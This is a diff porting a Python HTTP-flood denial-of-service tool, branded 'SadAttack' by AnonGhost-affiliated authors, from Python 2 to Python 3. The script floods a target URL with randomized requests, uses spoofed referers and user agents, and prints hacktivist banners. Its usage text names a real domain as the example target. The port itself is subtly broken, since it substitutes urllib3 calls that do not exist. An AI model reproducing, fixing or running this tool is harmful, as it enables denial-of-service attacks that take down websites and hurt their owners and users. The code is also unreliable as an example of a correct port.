@@ -9,7 +9,7 @@
 #Allahu Akbar!#
 
 
-import urllib2
+import urllib3
 import sys
 import threading
 import random
@@ -77,13 +77,13 @@ def referer_list():
 	headers_referers.append('http://www.sogou.com/web?query=')
 	headers_referers.append('http://api.duckduckgo.com/html/?q=')
 	headers_referers.append('http://boorow.com/Pages/site_br_aspx?query=')
-        headers_referers.append('http://validator.w3.org/check?uri=')
-        headers_referers.append('http://validator.w3.org/checklink?uri=')
-        headers_referers.append('http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
-        headers_referers.append('http://validator.w3.org/nu/?doc=')
-        headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
-        headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
-        headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
+	headers_referers.append('http://validator.w3.org/check?uri=')
+	headers_referers.append('http://validator.w3.org/checklink?uri=')
+	headers_referers.append('http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=')
+	headers_referers.append('http://validator.w3.org/nu/?doc=')
+	headers_referers.append('http://validator.w3.org/mobile/check?docAddr=')
+	headers_referers.append('http://validator.w3.org/p3p/20020128/p3p.pl?uri=')
+	headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
 	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
 	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
 	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
@@ -162,8 +162,8 @@ def keyword_list():
         keyword_top.append('Anonymous')
         keyword_top.append('DJ Bach')
 
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
+        headers_referers.append('http://' + host + '/')
+        return(headers_referers)
 	
 #builds random ascii string
 def buildblock(size):
@@ -174,14 +174,13 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'SadAttack Version 2.0 DDoS Tool Created By Hax Stroke and moddified by Akira '
-	print 'AnonGhost Team Page: http://facebook.com/anonghost.sec'
-	print 'New loaded Botnets: 39,445,657'
-	print 'Usage: botnet_akira (url)'
-	print 'Example: botnet_akira http://luthi.co.il/'
-	print "\a"
-print \
-"""                                                       
+	print ('SadAttack Version 2.0 DDoS Tool Created By Hax Stroke and moddified by Akira ')
+	print ('AnonGhost Team Page: http://facebook.com/anonghost.sec')
+	print ('New loaded Botnets: 39,445,657')
+	print ('Usage: botnet_akira (url)')
+	print ('Example: botnet_akira http://luthi.co.il/')
+	print ("\a")
+print("""                                                       
                                   ###################
                               ###!!!!!!!!!!!!!!!!!!!####
                           ###!!!!!!!!!!!!!!!!!!!!!!!!!####
@@ -217,7 +216,7 @@ _________________________________________________________________
 
   Music : https://www.youtube.com/watch?v=iX1a3JngmpI   
 _________________________________________________________________                                                           
-"""
+""")
 
 	
 #http request
@@ -229,7 +228,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -238,23 +237,23 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
+			urllib3.urlopen(request)
+	except urllib3.HTTPError:
 			#print e.code
 			set_flag(1)
- 			print '                                                                    '
- 			print '#~~~~~~~> We Are Anonymous <~~~~~~~~#~~~>We Come For Opicarus<~~#'
- 			print '#~~~~~~> Killuminati <~~~~~#~~~~~~~~~>Hello Banks<~~~~~~~~#'
- 			print '#~~~~~~> Freedom <~~~~~~~#~~~~>You R Our Target<~~~~#'
- 			print '#~~~> WATCH THIS <~~~#~~~>DDOS<~~~#'
- 			print '                                                                    '
+			print ('                                                                    ')
+			print ('#~~~~~~~> We Are Anonymous <~~~~~~~~#~~~>We Come For Opicarus<~~#')
+			print ('#~~~~~~> Killuminati <~~~~~#~~~~~~~~~>Hello Banks<~~~~~~~~#')
+			print ('#~~~~~~> Freedom <~~~~~~~#~~~~>You R Our Target<~~~~#')
+			print ('#~~~> WATCH THIS <~~~#~~~>DDOS<~~~#')
+			print ('                                                                    ')
 			code=500
-	except urllib2.URLError, e:
+	except urllib3.URLError:
 			#print e.reason
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib3.urlopen(request)
 	return(code)		
 
 	
@@ -266,7 +265,7 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except Exception:
 			pass
 
 # monitors http threads and counts requests
@@ -274,11 +273,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+150<request_counter) & (previous<>request_counter):
-				print "#~~~>ATTACK THE INTERNET: %d Sending more<~~~#" % (request_counter)
+			if (previous+150<request_counter) & (previous!=request_counter):
+				print(f"#~~~>ATTACK THE INTERNET: {request_counter} Sending more<~~~#")
 				previous=request_counter
 		if flag==2:
-			print "\n ~>Stopping the mass DDoS Attack<~"
+			print ("\n ~>Stopping the mass DDoS Attack<~")
 
 #execute 
 if len(sys.argv) < 2:
@@ -289,9 +288,9 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Starting the Sadness in webserver Sad DDoS Tool"
-		print "Created By Anonymous"
-		print "Moddified By Akira"
+		print ("Starting the Sadness in webserver Sad DDoS Tool")
+		print ("Created By Anonymous")
+		print ("Moddified By Akira")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
